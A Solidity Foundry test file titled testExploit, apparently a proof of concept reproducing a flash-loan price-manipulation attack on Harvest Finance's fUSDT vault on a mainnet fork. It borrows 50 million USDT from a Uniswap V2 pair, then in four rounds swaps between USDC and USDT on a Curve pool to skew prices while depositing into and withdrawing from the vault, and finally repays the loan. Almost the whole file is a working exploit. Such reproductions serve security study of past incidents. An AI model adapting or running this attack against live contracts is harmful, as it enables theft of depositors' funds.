// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "./interface.sol";


contract ContractTest is DSTest {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address USDT_WETH = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address ySwap = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address fUSDT = 0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C;


    function testExploit() public {
    cheat.startPrank(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT(USDT).transfer(address(this),234864);
    IERC20(USDC).transfer(address(this),408038262032);
    cheat.stopPrank();
    
    IUniswapV2Pair(USDT_WETH).swap(
            0,
            50_000_000 * 1e6,
            address(this),
            abi.encode(1)
        );
    }


    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external  {

    emit log_named_uint("Amount of USDT received:", IERC20(USDT).balanceOf(address(this)));
        IUSDT(USDT).approve(address(ySwap), 2**256 - 1);
        IUSDT(USDT).approve(address(fUSDT), 2**256 - 1);
        IERC20(fUSDT).approve(address(fUSDT), 2**256 - 1);
        IERC20(USDC).approve(address(ySwap), 2**256 - 1);

        for (uint256 i = 0; i < 4; i++) {
            uint256 usdcAmount = IERC20(USDC).balanceOf(address(this));

            emit log_named_uint("USDC in contract:", usdcAmount);
            ICurve(ySwap).exchange_underlying(1, 2, usdcAmount, 0);

            emit log_named_uint("USDT balance after swap:", IERC20(USDT).balanceOf(address(this)));
            uint256 slip = (IERC20(USDT).balanceOf(address(this)) * 5) / 1000;

            IFarm(fUSDT).deposit(IERC20(USDT).balanceOf(address(this)) - slip);

            uint256 fUSDTShares = IERC20(fUSDT).balanceOf(address(this));

            emit log_named_uint("deposited:", fUSDTShares);
            ICurve(ySwap).exchange_underlying(
                2,
                1,
                IERC20(USDT).balanceOf(address(this)),
                0
            );

            IFarm(fUSDT).withdraw(fUSDTShares);


    emit log_named_uint("USDC in contract:", usdcAmount);
    emit log_named_uint("USDT after withdraw", IERC20(USDT).balanceOf(address(this)));
    emit log_named_uint("USDC after withdraw", IERC20(USDC).balanceOf(address(this)));
        }

        uint256 returnAmountFee = (amount1 * 1000) / 997 + 1;
        IUSDT(USDT).transfer(USDT_WETH, returnAmountFee);
    emit log_named_uint("Flashloan Return Amount", returnAmountFee);

    }
        receive() external payable {}
}